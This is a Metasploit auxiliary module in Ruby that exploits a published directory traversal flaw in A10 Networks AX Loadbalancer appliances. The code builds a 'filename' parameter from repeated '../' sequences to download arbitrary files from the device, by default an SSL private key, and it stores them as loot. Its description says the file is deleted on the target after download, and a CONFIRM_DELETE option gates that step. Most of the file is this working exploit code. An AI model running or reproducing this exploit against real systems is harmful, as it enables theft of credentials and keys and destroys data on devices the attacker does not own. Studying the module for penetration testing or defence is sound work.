##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'A10 Networks AX Loadbalancer Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal flaw found in A10 Networks
        (Soft) AX Loadbalancer version 2.6.1-GR1-P5/2.7.0 or less.  When
        handling a file download request, the xml/downloads class fails to
        properly check the 'filename' parameter, which can be abused to read
        any file outside the virtual directory. Important files include SSL
        certificates. This module works on both the hardware devices and the
        Virtual Machine appliances. IMPORTANT NOTE: This module will also delete the
        file on the device after downloading it. Because of this, the CONFIRM_DELETE
        option must be set to 'true' either manually or by script.
      },
      'References'     =>
        [
          ['OSVDB', '102657'],
          ['BID', '65206'],
          ['EDB', '31261']
        ],
      'Author'         =>
        [
          'xistence'  #Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Jan 28 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the web application', '/']),
        OptString.new('FILE', [true, 'The file to obtain', '/a10data/key/mydomain.tld']),
        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10]),
        OptBool.new('CONFIRM_DELETE', [true, 'Run the module, even when it will delete files', false]),
      ], self.class)
  end

  def run
    unless datastore['CONFIRM_DELETE']
      print_error("This module will delete files on vulnerable systems. Please, set CONFIRM_DELETE in order to run it.")
      return
    end

    super
  end

  def run_host(ip)
    peer = "#{ip}:#{rport}"
    fname = datastore['FILE']

    print_status("#{peer} - Reading '#{datastore['FILE']}'")
    traverse = "../" * datastore['DEPTH']
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "xml", "downloads", ""),
      'vars_get' =>
        {
          'filename' => "/a10data/tmp/#{traverse}#{datastore['FILE']}"
        }
    })

    if res and res.code == 500 and res.body =~ /Error report/
      vprint_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
      vprint_error("\t1. File does not exist.")
      vprint_error("\t2. The server does not have any patches deployed.")
      vprint_error("\t3. Your 'DEPTH' option isn't deep enough.")
      vprint_error("\t4. Some kind of permission issues.")
    elsif res and res.code == 200
      data = res.body
      p = store_loot(
        'a10networks.ax',
        'application/octet-stream',
        ip,
        data,
        fname
      )
      vprint_line(data)
      print_good("#{peer} - #{fname} stored as '#{p}'")
    elsif res and res.code == 404 and res.body.to_s =~ /The requested URL.*was not found/
      vprint_error("#{peer} - File not found. Check FILE.")
    else
      vprint_error("#{peer} - Fail to obtain file for some unknown reason")
    end
  end

end
